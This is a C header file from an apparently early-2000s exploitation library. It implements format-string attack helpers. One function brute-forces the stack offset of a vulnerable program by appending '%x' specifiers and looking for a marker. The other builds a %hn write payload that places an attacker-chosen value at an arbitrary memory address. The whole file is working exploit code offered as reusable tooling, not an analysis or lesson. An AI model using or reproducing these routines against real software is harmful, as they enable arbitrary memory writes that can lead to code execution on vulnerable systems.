/*
 *  IOCExpLib.h - by IOC - www.ioc.fr.st
 *  Version: IOCExpLib v1.0a Beta - 06/03
 *  File name: IOCEL_fs.h 
 *  Description: includes format bugs exploitation functions
 *  Contact me - Li0n7@voila.fr
 *  Note: By now, only direct reference attack was implemented
 */






#ifndef __IOCEL_FS_H
#define __IOCEL_FS_H



#include "IOCExpLib.h"




#define VERBOSE





int
IOCExpLib_get_offset(char *progname)
{
      FILE * sortie;
      char ligne [128];
      char res [128];
      char vuln[128];
      char eats[5] = "%x";
      char *cmd = " BBBB";
      int offset = 0;

      snprintf(vuln, 128, "./%s", progname);
      fprintf(stderr, "[+] starting to try to find the offset...\n");

      strcat(vuln, cmd);

      while (1)
      {
          offset++;
          strncat(vuln, eats, sizeof(vuln));

          if ((sortie = popen(vuln, "r")) == NULL)
          {
               fprintf(stderr, "[-] Popen() error\n");
               exit (1);
          }

          #ifdef VERBOSE
              printf("[+] trying... %s\n", vuln);
          #endif

          while (fgets (ligne, 127, sortie) != NULL){
              if (sscanf (ligne, "%s", res) == 1)
                  if ((strstr (res, "42424242")) || (strstr (res, "424242")) || (strstr (res, "4242")))
                  {
                      fprintf(stdout, "[+] number of eats: %i\n", offset);
                      pclose(sortie);
                      return offset;
                  }
              }
          }
}










char*
IOCExpLib_fs_build(unsigned int addr, unsigned int value, unsigned int where)
{

        unsigned int length = 128; //j'ai la flemme de calculer ...
        unsigned int valh;
        unsigned int vall;
        unsigned char b0 = (addr >> 24) & 0xff;
        unsigned char b1 = (addr >> 16) & 0xff;
        unsigned char b2 = (addr >> 8) & 0xff;
        unsigned char b3 = (addr      ) & 0xff;

        char *buf;

        valh = (value >> 16) & 0xffff; //haut
        vall = value & 0xffff;         //bas

        #ifdef VERBOSE
            fprintf(stdout, "[+] adr : %d (%x)\n", addr, addr);
            fprintf(stdout, "[+] val : %d (%x)\n", value, value);
            fprintf(stdout, "[+] valh: %d (%.4x)\n", valh, valh);
            fprintf(stdout, "[+] vall: %d (%.4x)\n", vall, vall);
        #endif


        if ( ! (buf = (char *)malloc(length*sizeof(char))) ) {
            fprintf(stderr, "[-] Can't allocate buffer (%d).. Exiting.\n", length);
            exit(EXIT_FAILURE);
        }
        memset(buf, 0, length);


      if (valh < vall) {

          snprintf(buf,
	     length,
	     "%c%c%c%c"          
	     "%c%c%c%c"          

	     "%%.%hdx"          
	     "%%%d$hn"          

	     "%%.%hdx"           
	     "%%%d$hn"          
	     ,
	     b3+2, b2, b1, b0,    
	     b3, b2, b1, b0,    

	     valh-8,              
	     where,              

	     vall-valh,          
	     where+1             
	     );

      } else {

          snprintf(buf,
	     length,
	     "%c%c%c%c"        
	     "%c%c%c%c"         

	     "%%.%hdx"            
	     "%%%d$hn"           

	     "%%.%hdx"            
	     "%%%d$hn"            
	     ,
	     b3+2, b2, b1, b0,    
	     b3, b2, b1, b0,      

	     vall-8,              
	     where+1,             

	     valh-vall,           
	     where               
	     );
      }

      return buf;
}

#endif




